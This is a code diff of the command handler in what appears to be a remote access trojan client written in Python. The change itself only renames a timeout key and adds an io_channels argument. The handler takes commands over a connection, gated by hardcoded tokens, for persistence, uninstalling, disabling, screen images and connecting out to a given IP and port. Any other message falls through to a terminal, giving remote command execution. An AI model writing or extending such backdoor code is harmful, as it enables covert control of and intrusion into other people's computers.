@@ -31,13 +31,13 @@ def command_handling(conn, data):
 	message = data['message'].lower()
 
 	if data['message'] == 'CsBLDS4n5zPYq7JaxDjxWHK4':
-		send_data(conn, connection_data(data['silent'], (data['safe'], data['safe-timeout'])), settings)
+		send_data(conn, connection_data(data['silent'], data['io_channels'], (data['safe'], data['safe_timeout'])), settings)
 	elif data['message'] == 'bbCF2NNYjjTfHELUV9Y2qmkV':
 		send_data(conn, {'message': ' '}, settings)
 	elif message == 'uninstall':
 		send_data(conn, uninstall(), settings)
 	elif message == 'reconnect':
-		send_data(conn, reconnect((data['safe'], data['safe-timeout'])), settings)
+		send_data(conn, reconnect((data['safe'], data['safe_timeout'])), settings)
 	elif message == 'cd':
 		send_data(conn, cd(data['to']), settings)
 	elif message == 'image':
@@ -57,9 +57,9 @@ def command_handling(conn, data):
 	elif message == 'disable':
 		send_data(conn, disable(data['unlock']), settings)
 	elif message == 'persistence':
-		send_data(conn, persistence(data['action_type'], (data['safe'], data['safe-timeout'])), settings)
+		send_data(conn, persistence(data['action_type'], (data['safe'], data['safe_timeout'])), settings)
 	elif message == 'system':
-		send_data(conn, system(data['action_type'], (data['safe'], data['safe-timeout'])), settings)
+		send_data(conn, system(data['action_type'], (data['safe'], data['safe_timeout'])), settings)
 	elif message == 'recover':
 		send_data(conn, recover(), settings)
 	elif message == 'messagebox':
@@ -75,4 +75,4 @@ def command_handling(conn, data):
 	elif message == 'talk':
 		send_data(conn, talk(data['ip'], data['port']), settings)
 	else:
-		send_data(conn, {'message': terminal_pipe(data['message'], data['safe'], data['safe-timeout'])}, settings)
+		send_data(conn, {'message': terminal_pipe(data['message'], data['safe'], data['safe_timeout'])}, settings)
